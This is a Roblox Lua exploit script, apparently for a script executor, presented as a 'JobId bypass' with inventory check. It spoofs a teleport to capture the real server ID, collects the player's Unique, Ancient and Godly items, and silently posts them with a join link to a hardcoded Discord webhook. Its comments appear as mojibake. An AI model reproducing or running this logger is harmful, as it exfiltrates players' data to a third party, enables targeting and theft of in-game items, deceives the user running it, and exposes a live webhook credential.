-- ==============================
-- JobId Bypass + Inventory Check
-- ==============================
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local PlaceId = 126884695634066 -- Adopt Me PlaceId
local webhookUrl = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"

-- ---------------------------
-- –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
local function getInventory()
    local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
    local uniqueItems, ancientItems, godlyItems = {}, {}, {}
    local counts = {unique=0, ancient=0, godly=0}

    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(category) do
            if item.Rarity == "Unique" then
                counts.unique = counts.unique + 1
                table.insert(uniqueItems, item.ItemName)
            elseif item.Rarity == "Ancient" then
                counts.ancient = counts.ancient + 1
                table.insert(ancientItems, item.ItemName)
            elseif item.Rarity == "Godly" then
                counts.godly = counts.godly + 1
                table.insert(godlyItems, item.ItemName)
            end
        end
    end
    return counts, uniqueItems, ancientItems, godlyItems
end

-- ---------------------------
-- –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤–µ–±—Ö—É–∫–∞
local function sendWebhook(realJobId)
    local counts, uniqueItems, ancientItems, godlyItems = getInventory()
    if counts.unique >= 1 or counts.ancient >= 1 or counts.godly >= 1 then
        local fernUrl = "https://fern.wtf/joiner?placeId=" .. PlaceId .. "&gameInstanceId=" .. realJobId
        local webhookData = {
            embeds = {{
                title = "üîç JobID + Inventory Info",
                description = "Captured real JobID and inventory",
                color = 65280,
                fields = {
                    { name = "Real JobID", value = realJobId, inline = true },
                    { name = "Uniques", value = #uniqueItems > 0 and table.concat(uniqueItems, ", ") or "None", inline = false },
                    { name = "Ancients", value = #ancientItems > 0 and table.concat(ancientItems, ", ") or "None", inline = false },
                    { name = "Godlies", value = #godlyItems > 0 and table.concat(godlyItems, ", ") or "None", inline = false },
                    { name = "Fern.wtf Join Link", value = fernUrl, inline = false }
                },
                footer = { text = "Delta JobID + Inventory Logger" }
            }}
        }
        pcall(function()
            http_request({
                Url = webhookUrl,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(webhookData)
            })
        end)
    end
end

-- ---------------------------
-- JobId Bypass + –ü–µ—Ä–µ—Ö–≤–∞—Ç realJobId
TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportInfo)
    if teleportInfo and teleportInfo.ServerInstanceId then
        local realJobId = teleportInfo.ServerInstanceId
        print("Real JobId detected:", realJobId)

        -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º webhook —Å –∏–Ω–≤–µ–Ω—Ç–∞—Ä—ë–º
        sendWebhook(realJobId)

        -- ---------------------------
        -- –ü–µ—Ä–µ–∑–∞—Ö–æ–¥—á–∏–∫ —Å —Ä–µ–∞–ª—å–Ω—ã–º JobId
        queue_on_teleport(string.format([[getgenv().JobId = "%s"]], realJobId))
        for i = 1, 2 do
            task.spawn(function()
                pcall(function()
                    TeleportService:TeleportToPlaceInstance(PlaceId, realJobId)
                end)
            end)
            task.wait()
        end
    end
end)

-- ---------------------------
-- –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è "—Å–ø—É—Ñ-TP", —á—Ç–æ–±—ã –≤—ã–∑–≤–∞—Ç—å TeleportInitFailed
for i = 1, 2 do
    task.spawn(function()
        pcall(function()
            TeleportService:TeleportToPlaceInstance(PlaceId, "00000000-0000-0000-0000-000000000000")
        end)
    end)
    task.wait()
end
